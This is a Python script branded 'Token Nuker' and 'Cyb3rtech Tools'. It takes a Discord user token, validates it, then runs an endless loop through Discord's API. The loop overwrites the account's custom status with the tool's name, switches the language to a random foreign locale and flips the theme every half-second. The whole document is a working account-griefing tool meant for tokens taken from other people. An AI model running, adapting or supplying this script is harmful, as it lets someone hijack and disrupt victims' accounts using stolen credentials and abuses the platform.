import os
import requests
import random
import time
from itertools import cycle

BLUE = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"

logo = f"""
        {BLUE}▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███
        ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
        ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
        ░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄
          ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
          ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
           ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
          ░      ░ ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░       ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░
                     ░ ░  ░  ░      ░  ░         ░             ░    ░     ░  ░      ░  ░   ░

"""

def token_nuker(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if response.status_code != 200:
        print("\033[31m[!] Invalid Token\033[0m")
        return

    default_status = f"Cyb3rtech Tools >>"
    modes = cycle(["light", "dark"])

    while True:
        CustomStatus_default = {"custom_status": {"text": default_status}}
        try:
            requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_default)
            print(f"\033[31m[!] Status Changed to {default_status}\033[0m")
        except Exception as e:
            print(f"\033[31m[!] Error: {e}\033[0m")

        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(f"\033[31m[!] Language Changed to {random_language}\033[0m")
            except Exception as e:
                print(f"\033[31m[!] Error: {e}\033[0m")

            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(f"\033[31m[!] Theme Changed to {theme}\033[0m")
            except Exception as e:
                print(f"\033[31m[!] Error: {e}\033[0m")
            time.sleep(0.5)

if __name__ == "__main__":
    print(f"{logo}")
    token_discord = input('\033[31mToken >> \033[0m')
    token_nuker(token_discord)
